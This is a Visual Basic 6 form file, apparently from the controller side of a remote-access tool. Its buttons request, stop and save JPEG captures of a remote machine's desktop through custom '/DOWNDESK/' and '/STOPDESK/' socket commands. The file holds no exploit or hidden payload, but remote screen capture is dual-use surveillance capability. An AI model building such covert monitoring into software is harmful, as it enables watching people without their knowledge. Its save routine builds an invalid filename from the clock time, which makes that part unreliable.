VERSION 5.00
Begin VB.Form Form3 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Desktop"
   ClientHeight    =   8895
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   13665
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8895
   ScaleWidth      =   13665
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command4 
      Caption         =   "Exit"
      Height          =   375
      Left            =   12000
      TabIndex        =   7
      Top             =   8400
      Width           =   1575
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Save Image"
      Height          =   375
      Left            =   12000
      TabIndex        =   5
      Top             =   5400
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   12000
      TabIndex        =   3
      Text            =   "65"
      Top             =   1440
      Width           =   1575
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Cancel"
      Height          =   375
      Left            =   12000
      TabIndex        =   1
      Top             =   600
      Width           =   1575
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Retrive"
      Height          =   375
      Left            =   12000
      TabIndex        =   0
      Top             =   120
      Width           =   1575
   End
   Begin VB.Label Label2 
      Caption         =   "Quality Image:"
      Height          =   255
      Left            =   12000
      TabIndex        =   4
      Top             =   1200
      Width           =   1335
   End
   Begin VB.Label Label1 
      Caption         =   "Example: with screen of 1024x768 with quality image = 100 size is 271 Kb, with quality image = 50 size is 60k (JPG format)"
      Height          =   1575
      Left            =   12000
      TabIndex        =   2
      Top             =   2640
      Width           =   1455
   End
   Begin VB.Label Label3 
      Caption         =   "(Saved in Tempfolder)"
      Height          =   255
      Left            =   12000
      TabIndex        =   6
      Top             =   5880
      Width           =   1575
   End
   Begin VB.Image Image1 
      Height          =   8775
      Left            =   120
      Stretch         =   -1  'True
      Top             =   0
      Width           =   11770
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Command1_Click()
Image1.Picture = LoadPicture("")
On Error GoTo ExitForm3
    If Text1.Text <> "" Then
        Form1.Winsock1.SendData "/DOWNDESK/" & Text1.Text
    Else
ExitForm3:
        Form3.Hide
    End If
End Sub

Private Sub Command2_Click()
    Form1.Winsock1.SendData "/STOPDESK/"
    Close #FILEDESK
End Sub

Private Sub Command3_Click()
Dim parola As String
    On Error GoTo exitsub
        parola = IIf(Environ$("tmp") <> "", Environ$("tmp"), Environ$("temp"))
        Name parola & "\temp.jpg" As parola & "\" & Time & ".jpg"
exitsub:
End Sub


Private Sub Command4_Click()
    Form3.Hide
End Sub

